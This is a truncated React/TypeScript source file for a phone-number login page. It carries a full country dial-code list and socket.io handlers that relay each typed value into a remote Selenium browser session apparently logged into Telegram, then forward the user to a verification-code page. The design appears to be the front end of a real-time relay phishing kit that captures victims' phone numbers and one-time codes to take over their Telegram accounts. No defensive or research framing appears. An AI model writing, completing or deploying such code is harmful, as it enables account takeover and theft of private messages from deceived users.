import type { FC } from 'react';
import { useState, useEffect, useRef } from 'react';
import { io, Socket } from 'socket.io-client';
import { useNavigate } from 'react-router-dom';

import { Page } from '@/components/Page.tsx';


interface Country {
  code: string;
  name: string;
  flag: string;
  dialCode: string;
}

const countries: Country[] = [
  { code: 'AF', name: 'Afghanistan', flag: '🇦🇫', dialCode: '+93' },
  { code: 'AL', name: 'Albania', flag: '🇦🇱', dialCode: '+355' },
  { code: 'DZ', name: 'Algeria', flag: '🇩🇿', dialCode: '+213' },
  { code: 'AS', name: 'American Samoa', flag: '🇦🇸', dialCode: '+1684' },
  { code: 'AD', name: 'Andorra', flag: '🇦🇩', dialCode: '+376' },
  { code: 'AO', name: 'Angola', flag: '🇦🇴', dialCode: '+244' },
  { code: 'AI', name: 'Anguilla', flag: '🇦🇮', dialCode: '+1264' },
  { code: 'AQ', name: 'Anonymous Numbers', flag: '🏴‍☠️', dialCode: '+888' },
  { code: 'AG', name: 'Antigua & Barbuda', flag: '🇦🇬', dialCode: '+1268' },
  { code: 'AR', name: 'Argentina', flag: '🇦🇷', dialCode: '+54' },
  { code: 'AM', name: 'Armenia', flag: '🇦🇲', dialCode: '+374' },
  { code: 'AW', name: 'Aruba', flag: '🇦🇼', dialCode: '+297' },
  { code: 'AU', name: 'Australia', flag: '🇦🇺', dialCode: '+61' },
  { code: 'AT', name: 'Austria', flag: '🇦🇹', dialCode: '+43' },
  { code: 'AZ', name: 'Azerbaijan', flag: '🇦🇿', dialCode: '+994' },
  { code: 'BS', name: 'Bahamas', flag: '🇧🇸', dialCode: '+1242' },
  { code: 'BH', name: 'Bahrain', flag: '🇧🇭', dialCode: '+973' },
  { code: 'BD', name: 'Bangladesh', flag: '🇧🇩', dialCode: '+880' },
  { code: 'BB', name: 'Barbados', flag: '🇧🇧', dialCode: '+1246' },
  { code: 'BY', name: 'Belarus', flag: '🇧🇾', dialCode: '+375' },
  { code: 'BE', name: 'Belgium', flag: '🇧🇪', dialCode: '+32' },
  { code: 'BZ', name: 'Belize', flag: '🇧🇿', dialCode: '+501' },
  { code: 'BJ', name: 'Benin', flag: '🇧🇯', dialCode: '+229' },
  { code: 'BM', name: 'Bermuda', flag: '🇧🇲', dialCode: '+1441' },
  { code: 'BT', name: 'Bhutan', flag: '🇧🇹', dialCode: '+975' },
  { code: 'BO', name: 'Bolivia', flag: '🇧🇴', dialCode: '+591' },
  { code: 'BQ', name: 'Bonaire, Sint Eustatius & Saba', flag: '🇧🇶', dialCode: '+599' },
  { code: 'BA', name: 'Bosnia & Herzegovina', flag: '🇧🇦', dialCode: '+387' },
  { code: 'BW', name: 'Botswana', flag: '🇧🇼', dialCode: '+267' },
  { code: 'BR', name: 'Brazil', flag: '🇧🇷', dialCode: '+55' },
  { code: 'VG', name: 'British Virgin Islands', flag: '🇻🇬', dialCode: '+1284' },
  { code: 'BN', name: 'Brunei Darussalam', flag: '🇧🇳', dialCode: '+673' },
  { code: 'BG', name: 'Bulgaria', flag: '🇧🇬', dialCode: '+359' },
  { code: 'BF', name: 'Burkina Faso', flag: '🇧🇫', dialCode: '+226' },
  { code: 'BI', name: 'Burundi', flag: '🇧🇮', dialCode: '+257' },
  { code: 'KH', name: 'Cambodia', flag: '🇰🇭', dialCode: '+855' },
  { code: 'CM', name: 'Cameroon', flag: '🇨🇲', dialCode: '+237' },
  { code: 'CA', name: 'Canada', flag: '🇨🇦', dialCode: '+1' },
  { code: 'CV', name: 'Cape Verde', flag: '🇨🇻', dialCode: '+238' },
  { code: 'KY', name: 'Cayman Islands', flag: '🇰🇾', dialCode: '+1345' },
  { code: 'CF', name: 'Central African Rep.', flag: '🇨🇫', dialCode: '+236' },
  { code: 'TD', name: 'Chad', flag: '🇹🇩', dialCode: '+235' },
  { code: 'CL', name: 'Chile', flag: '🇨🇱', dialCode: '+56' },
  { code: 'CN', name: 'China', flag: '🇨🇳', dialCode: '+86' },
  { code: 'CO', name: 'Colombia', flag: '🇨🇴', dialCode: '+57' },
  { code: 'KM', name: 'Comoros', flag: '🇰🇲', dialCode: '+269' },
  { code: 'CD', name: 'Congo (Dem. Rep.)', flag: '🇨🇩', dialCode: '+243' },
  { code: 'CG', name: 'Congo (Rep.)', flag: '🇨🇬', dialCode: '+242' },
  { code: 'CK', name: 'Cook Islands', flag: '🇨🇰', dialCode: '+682' },
  { code: 'CR', name: 'Costa Rica', flag: '🇨🇷', dialCode: '+506' },
  { code: 'CI', name: 'Côte d\'Ivoire', flag: '🇨🇮', dialCode: '+225' },
  { code: 'HR', name: 'Croatia', flag: '🇭🇷', dialCode: '+385' },
  { code: 'CU', name: 'Cuba', flag: '🇨🇺', dialCode: '+53' },
  { code: 'CW', name: 'Curaçao', flag: '🇨🇼', dialCode: '+599' },
  { code: 'CY', name: 'Cyprus', flag: '🇨🇾', dialCode: '+357' },
  { code: 'CZ', name: 'Czech Republic', flag: '🇨🇿', dialCode: '+420' },
  { code: 'DK', name: 'Denmark', flag: '🇩🇰', dialCode: '+45' },
  { code: 'IO', name: 'Diego Garcia', flag: '🇮🇴', dialCode: '+246' },
  { code: 'DJ', name: 'Djibouti', flag: '🇩🇯', dialCode: '+253' },
  { code: 'DM', name: 'Dominica', flag: '🇩🇲', dialCode: '+1767' },
  { code: 'DO', name: 'Dominican Rep.', flag: '🇩🇴', dialCode: '+1809' },
  { code: 'EC', name: 'Ecuador', flag: '🇪🇨', dialCode: '+593' },
  { code: 'EG', name: 'Egypt', flag: '🇪🇬', dialCode: '+20' },
  { code: 'SV', name: 'El Salvador', flag: '🇸🇻', dialCode: '+503' },
  { code: 'GQ', name: 'Equatorial Guinea', flag: '🇬🇶', dialCode: '+240' },
  { code: 'ER', name: 'Eritrea', flag: '🇪🇷', dialCode: '+291' },
  { code: 'EE', name: 'Estonia', flag: '🇪🇪', dialCode: '+372' },
  { code: 'SZ', name: 'Eswatini', flag: '🇸🇿', dialCode: '+268' },
  { code: 'ET', name: 'Ethiopia', flag: '🇪🇹', dialCode: '+251' },
  { code: 'FK', name: 'Falkland Islands', flag: '🇫🇰', dialCode: '+500' },
  { code: 'FO', name: 'Faroe Islands', flag: '🇫🇴', dialCode: '+298' },
  { code: 'FJ', name: 'Fiji', flag: '🇫🇯', dialCode: '+679' },
  { code: 'FI', name: 'Finland', flag: '🇫🇮', dialCode: '+358' },
  { code: 'FR', name: 'France', flag: '🇫🇷', dialCode: '+33' },
  { code: 'GF', name: 'French Guiana', flag: '🇬🇫', dialCode: '+594' },
  { code: 'PF', name: 'French Polynesia', flag: '🇵🇫', dialCode: '+689' },
  { code: 'GA', name: 'Gabon', flag: '🇬🇦', dialCode: '+241' },
  { code: 'GM', name: 'Gambia', flag: '🇬🇲', dialCode: '+220' },
  { code: 'GE', name: 'Georgia', flag: '🇬🇪', dialCode: '+995' },
  { code: 'DE', name: 'Germany', flag: '🇩🇪', dialCode: '+49' },
  { code: 'GH', name: 'Ghana', flag: '🇬🇭', dialCode: '+233' },
  { code: 'GI', name: 'Gibraltar', flag: '🇬🇮', dialCode: '+350' },
  { code: 'GR', name: 'Greece', flag: '🇬🇷', dialCode: '+30' },
  { code: 'GL', name: 'Greenland', flag: '🇬🇱', dialCode: '+299' },
  { code: 'GD', name: 'Grenada', flag: '🇬🇩', dialCode: '+1473' },
  { code: 'GP', name: 'Guadeloupe', flag: '🇬🇵', dialCode: '+590' },
  { code: 'GU', name: 'Guam', flag: '🇬🇺', dialCode: '+1671' },
  { code: 'GT', name: 'Guatemala', flag: '🇬🇹', dialCode: '+502' },
  { code: 'GN', name: 'Guinea', flag: '🇬🇳', dialCode: '+224' },
  { code: 'GW', name: 'Guinea-Bissau', flag: '🇬🇼', dialCode: '+245' },
  { code: 'GY', name: 'Guyana', flag: '🇬🇾', dialCode: '+592' },
  { code: 'HT', name: 'Haiti', flag: '🇭🇹', dialCode: '+509' },
  { code: 'HN', name: 'Honduras', flag: '🇭🇳', dialCode: '+504' },
  { code: 'HK', name: 'Hong Kong', flag: '🇭🇰', dialCode: '+852' },
  { code: 'HU', name: 'Hungary', flag: '🇭🇺', dialCode: '+36' },
  { code: 'IS', name: 'Iceland', flag: '🇮🇸', dialCode: '+354' },
  { code: 'IN', name: 'India', flag: '🇮🇳', dialCode: '+91' },
  { code: 'ID', name: 'Indonesia', flag: '🇮🇩', dialCode: '+62' },
  { code: 'IR', name: 'Iran', flag: '🇮🇷', dialCode: '+98' },
  { code: 'IQ', name: 'Iraq', flag: '🇮🇶', dialCode: '+964' },
  { code: 'IE', name: 'Ireland', flag: '🇮🇪', dialCode: '+353' },
  { code: 'IL', name: 'Israel', flag: '🇮🇱', dialCode: '+972' },
  { code: 'IT', name: 'Italy', flag: '🇮🇹', dialCode: '+39' },
  { code: 'JM', name: 'Jamaica', flag: '🇯🇲', dialCode: '+1876' },
  { code: 'JP', name: 'Japan', flag: '🇯🇵', dialCode: '+81' },
  { code: 'JO', name: 'Jordan', flag: '🇯🇴', dialCode: '+962' },
  { code: 'KZ', name: 'Kazakhstan', flag: '🇰🇿', dialCode: '+7' },
  { code: 'KE', name: 'Kenya', flag: '🇰🇪', dialCode: '+254' },
  { code: 'KI', name: 'Kiribati', flag: '🇰🇮', dialCode: '+686' },
  { code: 'XK', name: 'Kosovo', flag: '🇽🇰', dialCode: '+383' },
  { code: 'KW', name: 'Kuwait', flag: '🇰🇼', dialCode: '+965' },
  { code: 'KG', name: 'Kyrgyzstan', flag: '🇰🇬', dialCode: '+996' },
  { code: 'LA', name: 'Laos', flag: '🇱🇦', dialCode: '+856' },
  { code: 'LV', name: 'Latvia', flag: '🇱🇻', dialCode: '+371' },
  { code: 'LB', name: 'Lebanon', flag: '🇱🇧', dialCode: '+961' },
  { code: 'LS', name: 'Lesotho', flag: '🇱🇸', dialCode: '+266' },
  { code: 'LR', name: 'Liberia', flag: '🇱🇷', dialCode: '+231' },
  { code: 'LY', name: 'Libya', flag: '🇱🇾', dialCode: '+218' },
  { code: 'LI', name: 'Liechtenstein', flag: '🇱🇮', dialCode: '+423' },
  { code: 'LT', name: 'Lithuania', flag: '🇱🇹', dialCode: '+370' },
  { code: 'LU', name: 'Luxembourg', flag: '🇱🇺', dialCode: '+352' },
  { code: 'MO', name: 'Macau', flag: '🇲🇴', dialCode: '+853' },
  { code: 'MG', name: 'Madagascar', flag: '🇲🇬', dialCode: '+261' },
  { code: 'MW', name: 'Malawi', flag: '🇲🇼', dialCode: '+265' },
  { code: 'MY', name: 'Malaysia', flag: '🇲🇾', dialCode: '+60' },
  { code: 'MV', name: 'Maldives', flag: '🇲🇻', dialCode: '+960' },
  { code: 'ML', name: 'Mali', flag: '🇲🇱', dialCode: '+223' },
  { code: 'MT', name: 'Malta', flag: '🇲🇹', dialCode: '+356' },
  { code: 'MH', name: 'Marshall Islands', flag: '🇲🇭', dialCode: '+692' },
  { code: 'MQ', name: 'Martinique', flag: '🇲🇶', dialCode: '+596' },
  { code: 'MR', name: 'Mauritania', flag: '🇲🇷', dialCode: '+222' },
  { code: 'MU', name: 'Mauritius', flag: '🇲🇺', dialCode: '+230' },
  { code: 'MX', name: 'Mexico', flag: '🇲🇽', dialCode: '+52' },
  { code: 'FM', name: 'Micronesia', flag: '🇫🇲', dialCode: '+691' },
  { code: 'MD', name: 'Moldova', flag: '🇲🇩', dialCode: '+373' },
  { code: 'MC', name: 'Monaco', flag: '🇲🇨', dialCode: '+377' },
  { code: 'MN', name: 'Mongolia', flag: '🇲🇳', dialCode: '+976' },
  { code: 'ME', name: 'Montenegro', flag: '🇲🇪', dialCode: '+382' },
  { code: 'MS', name: 'Montserrat', flag: '🇲🇸', dialCode: '+1664' },
  { code: 'MA', name: 'Morocco', flag: '🇲🇦', dialCode: '+212' },
  { code: 'MZ', name: 'Mozambique', flag: '🇲🇿', dialCode: '+258' },
  { code: 'MM', name: 'Myanmar', flag: '🇲🇲', dialCode: '+95' },
  { code: 'NA', name: 'Namibia', flag: '🇳🇦', dialCode: '+264' },
  { code: 'NR', name: 'Nauru', flag: '🇳🇷', dialCode: '+674' },
  { code: 'NP', name: 'Nepal', flag: '🇳🇵', dialCode: '+977' },
  { code: 'NL', name: 'Netherlands', flag: '🇳🇱', dialCode: '+31' },
  { code: 'NC', name: 'New Caledonia', flag: '🇳🇨', dialCode: '+687' },
  { code: 'NZ', name: 'New Zealand', flag: '🇳🇿', dialCode: '+64' },
  { code: 'NI', name: 'Nicaragua', flag: '🇳🇮', dialCode: '+505' },
  { code: 'NE', name: 'Niger', flag: '🇳🇪', dialCode: '+227' },
  { code: 'NG', name: 'Nigeria', flag: '🇳🇬', dialCode: '+234' },
  { code: 'NU', name: 'Niue', flag: '🇳🇺', dialCode: '+683' },
  { code: 'NF', name: 'Norfolk Island', flag: '🇳🇫', dialCode: '+672' },
  { code: 'KP', name: 'North Korea', flag: '🇰🇵', dialCode: '+850' },
  { code: 'MK', name: 'North Macedonia', flag: '🇲🇰', dialCode: '+389' },
  { code: 'MP', name: 'Northern Mariana Islands', flag: '🇲🇵', dialCode: '+1670' },
  { code: 'NO', name: 'Norway', flag: '🇳🇴', dialCode: '+47' },
  { code: 'OM', name: 'Oman', flag: '🇴🇲', dialCode: '+968' },
  { code: 'PK', name: 'Pakistan', flag: '🇵🇰', dialCode: '+92' },
  { code: 'PW', name: 'Palau', flag: '🇵🇼', dialCode: '+680' },
  { code: 'PS', name: 'Palestine', flag: '🇵🇸', dialCode: '+970' },
  { code: 'PA', name: 'Panama', flag: '🇵🇦', dialCode: '+507' },
  { code: 'PG', name: 'Papua New Guinea', flag: '🇵🇬', dialCode: '+675' },
  { code: 'PY', name: 'Paraguay', flag: '🇵🇾', dialCode: '+595' },
  { code: 'PE', name: 'Peru', flag: '🇵🇪', dialCode: '+51' },
  { code: 'PH', name: 'Philippines', flag: '🇵🇭', dialCode: '+63' },
  { code: 'PL', name: 'Poland', flag: '🇵🇱', dialCode: '+48' },
  { code: 'PT', name: 'Portugal', flag: '🇵🇹', dialCode: '+351' },
  { code: 'PR', name: 'Puerto Rico', flag: '🇵🇷', dialCode: '+1787' },
  { code: 'QA', name: 'Qatar', flag: '🇶🇦', dialCode: '+974' },
  { code: 'RE', name: 'Réunion', flag: '🇷🇪', dialCode: '+262' },
  { code: 'RO', name: 'Romania', flag: '🇷🇴', dialCode: '+40' },
  { code: 'RU', name: 'Russian Federation', flag: '🇷🇺', dialCode: '+7' },
  { code: 'RW', name: 'Rwanda', flag: '🇷🇼', dialCode: '+250' },
  { code: 'SH', name: 'Saint Helena', flag: '🇸🇭', dialCode: '+247' },
  { code: 'KN', name: 'Saint Kitts & Nevis', flag: '🇰🇳', dialCode: '+1869' },
  { code: 'LC', name: 'Saint Lucia', flag: '🇱🇨', dialCode: '+1758' },
  { code: 'PM', name: 'Saint Pierre & Miquelon', flag: '🇵🇲', dialCode: '+508' },
  { code: 'VC', name: 'Saint Vincent & the Grenadines', flag: '🇻🇨', dialCode: '+1784' },
  { code: 'WS', name: 'Samoa', flag: '🇼🇸', dialCode: '+685' },
  { code: 'SM', name: 'San Marino', flag: '🇸🇲', dialCode: '+378' },
  { code: 'ST', name: 'São Tomé & Príncipe', flag: '🇸🇹', dialCode: '+239' },
  { code: 'SA', name: 'Saudi Arabia', flag: '🇸🇦', dialCode: '+966' },
  { code: 'SN', name: 'Senegal', flag: '🇸🇳', dialCode: '+221' },
  { code: 'RS', name: 'Serbia', flag: '🇷🇸', dialCode: '+381' },
  { code: 'SC', name: 'Seychelles', flag: '🇸🇨', dialCode: '+248' },
  { code: 'SL', name: 'Sierra Leone', flag: '🇸🇱', dialCode: '+232' },
  { code: 'SG', name: 'Singapore', flag: '🇸🇬', dialCode: '+65' },
  { code: 'SX', name: 'Sint Maarten', flag: '🇸🇽', dialCode: '+1721' },
  { code: 'SK', name: 'Slovakia', flag: '🇸🇰', dialCode: '+421' },
  { code: 'SI', name: 'Slovenia', flag: '🇸🇮', dialCode: '+386' },
  { code: 'SB', name: 'Solomon Islands', flag: '🇸🇧', dialCode: '+677' },
  { code: 'SO', name: 'Somalia', flag: '🇸🇴', dialCode: '+252' },
  { code: 'ZA', name: 'South Africa', flag: '🇿🇦', dialCode: '+27' },
  { code: 'KR', name: 'South Korea', flag: '🇰🇷', dialCode: '+82' },
  { code: 'SS', name: 'South Sudan', flag: '🇸🇸', dialCode: '+211' },
  { code: 'ES', name: 'Spain', flag: '🇪🇸', dialCode: '+34' },
  { code: 'LK', name: 'Sri Lanka', flag: '🇱🇰', dialCode: '+94' },
  { code: 'SD', name: 'Sudan', flag: '🇸🇩', dialCode: '+249' },
  { code: 'SR', name: 'Suriname', flag: '🇸🇷', dialCode: '+597' },
  { code: 'SE', name: 'Sweden', flag: '🇸🇪', dialCode: '+46' },
  { code: 'CH', name: 'Switzerland', flag: '🇨🇭', dialCode: '+41' },
  { code: 'SY', name: 'Syria', flag: '🇸🇾', dialCode: '+963' },
  { code: 'TW', name: 'Taiwan', flag: '🇹🇼', dialCode: '+886' },
  { code: 'TJ', name: 'Tajikistan', flag: '🇹🇯', dialCode: '+992' },
  { code: 'TZ', name: 'Tanzania', flag: '🇹🇿', dialCode: '+255' },
  { code: 'TH', name: 'Thailand', flag: '🇹🇭', dialCode: '+66' },
  { code: 'TL', name: 'Timor-Leste', flag: '🇹🇱', dialCode: '+670' },
  { code: 'TG', name: 'Togo', flag: '🇹🇬', dialCode: '+228' },
  { code: 'TK', name: 'Tokelau', flag: '🇹🇰', dialCode: '+690' },
  { code: 'TO', name: 'Tonga', flag: '🇹🇴', dialCode: '+676' },
  { code: 'TT', name: 'Trinidad & Tobago', flag: '🇹🇹', dialCode: '+1868' },
  { code: 'TN', name: 'Tunisia', flag: '🇹🇳', dialCode: '+216' },
  { code: 'TR', name: 'Turkey', flag: '🇹🇷', dialCode: '+90' },
  { code: 'TM', name: 'Turkmenistan', flag: '🇹🇲', dialCode: '+993' },
  { code: 'TC', name: 'Turks & Caicos Islands', flag: '🇹🇨', dialCode: '+1649' },
  { code: 'TV', name: 'Tuvalu', flag: '🇹🇻', dialCode: '+688' },
  { code: 'UG', name: 'Uganda', flag: '🇺🇬', dialCode: '+256' },
  { code: 'UA', name: 'Ukraine', flag: '🇺🇦', dialCode: '+380' },
  { code: 'AE', name: 'United Arab Emirates', flag: '🇦🇪', dialCode: '+971' },
  { code: 'GB', name: 'United Kingdom', flag: '🇬🇧', dialCode: '+44' },
  { code: 'UY', name: 'Uruguay', flag: '🇺🇾', dialCode: '+598' },
  { code: 'VI', name: 'US Virgin Islands', flag: '🇻🇮', dialCode: '+1340' },
  { code: 'US', name: 'USA', flag: '🇺🇸', dialCode: '+1' },
  { code: 'UZ', name: 'Uzbekistan', flag: '🇺🇿', dialCode: '+998' },
  { code: 'VU', name: 'Vanuatu', flag: '🇻🇺', dialCode: '+678' },
  { code: 'VE', name: 'Venezuela', flag: '🇻🇪', dialCode: '+58' },
  { code: 'VN', name: 'Vietnam', flag: '🇻🇳', dialCode: '+84' },
  { code: 'WF', name: 'Wallis & Futuna', flag: '🇼🇫', dialCode: '+681' },
  { code: 'YE', name: 'Yemen', flag: '🇾🇪', dialCode: '+967' },
  { code: 'ZM', name: 'Zambia', flag: '🇿🇲', dialCode: '+260' },
  { code: 'ZW', name: 'Zimbabwe', flag: '🇿🇼', dialCode: '+263' }
];

export const PhoneLoginPage: FC = () => {
  const navigate = useNavigate();
  const [selectedCountry, setSelectedCountry] = useState<Country>(countries[0]);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);
  const [isSeleniumReady, setIsSeleniumReady] = useState(false);
  const [seleniumStatus, setSeleniumStatus] = useState<string>('Checking Selenium...');
  const [qrCodeButtonFound, setQrCodeButtonFound] = useState(false);
  const [isQrCodeButtonLoading, setIsQrCodeButtonLoading] = useState(false);
  const [phoneCodeInputFound, setPhoneCodeInputFound] = useState(false);
  const [phoneNumberInputFound, setPhoneNumberInputFound] = useState(false);
  const [isInputsReady, setIsInputsReady] = useState(false);
  const [isMonitoringVerificationPage, setIsMonitoringVerificationPage] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const socketRef = useRef<Socket | null>(null);
  const sessionIdRef = useRef<string>('');

  // Flag to prevent state updates during our own sync operations
  const isSyncingRef = useRef(false);

  // Add debounced retry mechanism to prevent spam
  const retryTimeouts = useRef<Map<string, ReturnType<typeof setTimeout>>>(new Map());
  
  const scheduleRetry = (elementType: string, isRateLimited: boolean = false) => {
    // Clear any existing retry timeout for this element type
    const existingTimeout = retryTimeouts.current.get(elementType);
    if (existingTimeout) {
      clearTimeout(existingTimeout);
    }
    
    // Schedule retry with appropriate delay
    const delay = isRateLimited ? 10000 : 2000; // 10s for rate limited, 2s for not found
    
    const timeout = setTimeout(() => {
      const socket = socketRef.current;
      if (socket && socket.connected) {
        if (elementType === 'phoneCodeInput' || elementType === 'phoneNumberInput') {
          checkInputFieldsInSelenium();
        } else {
          checkQrCodeButtonInSelenium();
        }
      }
      // Remove the timeout from the map
      retryTimeouts.current.delete(elementType);
    }, delay);
    
    retryTimeouts.current.set(elementType, timeout);
  };
  
  const clearAllRetries = () => {
    retryTimeouts.current.forEach(timeout => clearTimeout(timeout));
    retryTimeouts.current.clear();
  };

  // Initialize socket connection and check for QR code button
  useEffect(() => {
    // Get session ID from URL or localStorage
    const urlParams = new URLSearchParams(window.location.search);
    let sessionId = urlParams.get('sessionId');
    
    // If not in URL, try to get from localStorage
    if (!sessionId) {
      sessionId = localStorage.getItem('telegram_session_id') || '';
      console.log('🔍 PhoneLoginPage: Session ID not in URL, trying localStorage:', sessionId);
    }
    
    // If still no session ID, try to get from sessionStorage
    if (!sessionId) {
      sessionId = sessionStorage.getItem('telegram_session_id') || '';
      console.log('🔍 PhoneLoginPage: Session ID not in localStorage, trying sessionStorage:', sessionId);
    }
    
    sessionIdRef.current = sessionId;

    console.log('🔍 PhoneLoginPage: Final session ID:', sessionId);
    console.log('🔍 PhoneLoginPage: URL search params:', window.location.search);

    if (sessionId) {
      console.log('✅ PhoneLoginPage: Session ID found, establishing robust connection...');
      

      
      // Function to set up event handlers for a socket
      const setupEventHandlers = (socket: any) => {
        if (!socket) return;
        
        socket.on('elementCheckResult', (data: any) => {
          console.log('🔍 Element check result for QR code button:', data);
          if (data.sessionId === sessionId) {
            if (data.elementFound) {
              console.log('✅ Element found in Selenium window:', data.elementType || 'unknown');
              
              // Update state based on element type
              if (data.elementType === 'phoneCodeInput') {
                setPhoneCodeInputFound(true);
                console.log('✅ Phone code input field found, updating state');
              } else if (data.elementType === 'phoneNumberInput') {
                setPhoneNumberInputFound(true);
                console.log('✅ Phone number input field found, updating state');
              } else if (data.elementType === 'verificationCodeInput') {
                console.log('🎉 Verification code input field found! Page has transitioned successfully!');
                
                // CRITICAL SAFETY CHECK: Only allow navigation if we're actually submitting the form
                if (!isSubmitting) {
                  console.log('🚨 SECURITY ALERT: Verification code input detected but form is not being submitted!');
                  console.log('🚨 This suggests premature navigation - blocking for safety');
                  setSeleniumStatus('🚨 Security: Verification page detected prematurely - blocked');
                  return; // Block navigation
                }
                
                setSeleniumStatus('Verification code page loaded! Navigating...');
                
                // Navigate to verification code page
                setTimeout(() => {
                  console.log('🔄 Navigating to verification code page...');
                  setIsMonitoringVerificationPage(false);
                  
                  // Get the actual phone number from Selenium window to ensure accuracy
                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
                    console.log('🔍 Getting actual phone number from Selenium before navigation...');
                    socketRef.current.emit('getCurrentInputValue', {
                      sessionId: sessionIdRef.current,
                      inputType: 'phoneNumber',
                      timestamp: new Date().toISOString()
                    });
                    
                    // Listen for the response and then navigate
                    socketRef.current.once('seleniumInputChange', (data) => {
                      if (data.inputType === 'phoneNumber' && data.action === 'currentValue') {
                        console.log('🔍 Actual phone number from Selenium:', data.value);
                        console.log('🔍 React state phone number:', phoneNumber);
                        
                        // Use the actual Selenium value for navigation
                        const actualPhoneNumber = data.value || phoneNumber;
                        console.log('🔍 Using phone number for navigation:', actualPhoneNumber);
                        
                        // CRITICAL: Reset isSubmitting when navigation happens
                        setIsSubmitting(false);
                        console.log('🔒 isSubmitting reset to false for navigation');
                        
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(actualPhoneNumber)}`);
                      } else {
                        // Fallback to React state if Selenium response is unexpected
                        console.log('🔍 Using React state as fallback:', phoneNumber);
                        
                        // CRITICAL: Reset isSubmitting when navigation happens
                        setIsSubmitting(false);
                        console.log('🔒 isSubmitting reset to false for fallback navigation');
                        
                        navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                      }
                    });
                    
                    // Set a timeout in case Selenium doesn't respond
                    setTimeout(() => {
                      console.log('🔍 Selenium timeout, using React state:', phoneNumber);
                      
                      // CRITICAL: Reset isSubmitting when navigation happens
                      setIsSubmitting(false);
                      console.log('🔒 isSubmitting reset to false for timeout navigation');
                      
                      navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                    }, 2000);
                  } else {
                    // Fallback if socket not connected
                    console.log('🔍 Socket not connected, using React state:', phoneNumber);
                    
                    // CRITICAL: Reset isSubmitting when navigation happens
                    setIsSubmitting(false);
                    console.log('🔒 isSubmitting reset to false for socket fallback navigation');
                    
                    navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
                  }
                }, 500); // Short delay to ensure smooth transition
                return; // Exit early since we're navigating
              } else {
                // Default case: QR code button
                setQrCodeButtonFound(true);
                setSeleniumStatus('QR code button ready');
                console.log('✅ QR code button found, updating state');
              }
              
              // Check if all inputs are ready - use the updated state values
              const currentPhoneCodeFound = data.elementType === 'phoneCodeInput' ? true : phoneCodeInputFound;
              const currentPhoneNumberFound = data.elementType === 'phoneNumberInput' ? true : phoneNumberInputFound;
              
              if (currentPhoneCodeFound && currentPhoneNumberFound) {
                console.log('🎉 All input fields are ready! Enabling form...');
                setIsInputsReady(true);
                setSeleniumStatus('Selenium ready - all elements found!');
              } else {
                console.log('⏳ Still waiting for input fields:', {
                  phoneCodeFound: currentPhoneCodeFound,
                  phoneNumberFound: currentPhoneNumberFound
                });
                setSeleniumStatus(`Waiting for Selenium elements: Phone Code ${currentPhoneCodeFound ? '✅' : '⏳'}, Phone Number ${currentPhoneNumberFound ? '✅' : '⏳'}`);
              }
            } else {
              console.log('❌ Element not found in Selenium window:', data.elementType);
              
              // Check if it's a session error
              if (data.error && data.error.includes('Session is no longer active')) {
                setSeleniumStatus('❌ Selenium session not found - please start a new session');
                setIsInputsReady(false);
              } else if (data.error && data.error.includes('Rate limited')) {
                setSeleniumStatus('⏳ Rate limited - waiting before retry...');
              } else {
                setSeleniumStatus(`Element not found: ${data.elementType} - waiting for Selenium...`);
              }
            }
          }
        });

        // Handle session status response
        socket.on('sessionStatusResult', (data: any) => {
          console.log('🔍 Session status result:', data);
          if (data.sessionId === sessionId) {
            if (data.isActive) {
              console.log('✅ Selenium session is active');
              setSeleniumStatus('Selenium session active, checking elements...');
              // Check for elements
              checkQrCodeButtonInSelenium();
            } else {
              console.log('❌ Selenium session is not active');
              setSeleniumStatus('❌ No Selenium session found - please start a new session');
              setIsInputsReady(false);
            }
          }
        });

        // Handle Telegram login updates from Selenium (including page transitions)
        socket.on('telegramLoginUpdate', (data: any) => {
          console.log('🔍 Telegram login update received:', data);
          if (data.sessionId === sessionId) {
            console.log('✅ Processing update for current session:', data.event);
            
            switch (data.event) {
              case 'buttonClicked':
                console.log('✅ Auth form button clicked successfully');
                // Note: This event is now handled in handleSubmit, not here
                // The button click confirmation will start verification page monitoring
                break;
                
              case 'error':
                console.error('❌ Error from Selenium:', data.data?.error);
                setSeleniumStatus(`Error: ${data.data?.error || 'Unknown error'}`);
                // Re-enable form on error
                setIsInputsReady(true);
                break;
                
              default:
                console.log('📝 Other update event:', data.event, data.data);
                break;
            }
          } else {
            console.log('❌ Session ID mismatch, ignoring update');
          }
        });

        // Handle test connection result
        socket.on('testConnectionResult', (data: any) => {
          console.log('🧪 Test connection result:', data);
          if (data.sessionId === sessionId) {
            if (data.success) {
              setSeleniumStatus(`✅ Test successful: ${data.message}`);
            } else {
              setSeleniumStatus(`❌ Test failed: ${data.message}`);
            }
          }
        });

        // Listen for page structure inspection results
        socket.on('pageStructureResult', (data: any) => {
          console.log('🔍 Page structure inspection result:', data);
          if (data.sessionId === sessionId) {
            if (data.error) {
              console.error('❌ Page structure inspection error:', data.error);
              setSeleniumStatus(`Page inspection error: ${data.error}`);
            } else {
              console.log('✅ Page structure inspection completed');
              console.log('📄 Page title:', data.title);
              console.log('🔗 Page URL:', data.url);
              console.log('📝 Input elements found:', data.inputs?.length || 0);
              console.log('🔘 Button elements found:', data.buttons?.length || 0);
              
              // Log all input elements for debugging
              if (data.inputs) {
                data.inputs.forEach((input: any, index: number) => {
                  console.log(`📝 Input ${index + 1}:`, input);
                });
              }
              
              // Log all button elements for debugging
              if (data.buttons) {
                data.buttons.forEach((button: any, index: number) => {
                  console.log(`🔘 Button ${index + 1}:`, button);
                });
              }
              
              setSeleniumStatus(`Page inspection completed: ${data.inputs?.length || 0} inputs, ${data.buttons?.length || 0} buttons`);
            }
          }
        });

        // Listen for input changes from Selenium
        socket.on('seleniumInputChange', (data: any) => {
          console.log('🔄 INPUT CHANGE EVENT RECEIVED');
          console.log('🔄 Full event data:', JSON.stringify(data, null, 2));
          console.log('🔒 Is syncing flag:', isSyncingRef.current);
          console.log('📱 Current React phone number:', phoneNumber);
          
          if (data.sessionId === sessionId) {
